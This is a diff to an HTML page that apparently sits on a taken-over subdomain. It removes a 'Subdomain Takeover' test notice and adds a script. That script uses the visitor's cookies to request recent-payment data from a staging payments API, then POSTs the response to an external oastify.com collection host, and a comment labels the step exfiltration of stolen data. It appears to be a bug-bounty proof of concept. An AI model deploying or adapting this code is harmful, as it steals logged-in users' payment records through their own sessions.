@@ -1,10 +1,20 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Security Test Page</title>
-</head>
 <body>
-    <h1>Security Testing Page</h1>
-    <p>This page is hosted for check Subdomain Takeover Vulnerability.</p>
+<script>
+fetch("https://staging.mercurycardscloud.com/act/gateway/orchestration-service/api/v1/payments/85009400748041/recentPayments", {
+  method: "GET",
+  credentials: "include"
+})
+.then(response => response.text())
+.then(data => {
+  // Exfiltrate the stolen data to attacker-controlled server
+  fetch("https://d3hfe0e1ctma62euu1vu9z4d248vwskh.oastify.com/", {
+    method: "POST",
+    body: data
+  });
+})
+.catch(error => console.error(error));
+</script>
 </body>
 </html>
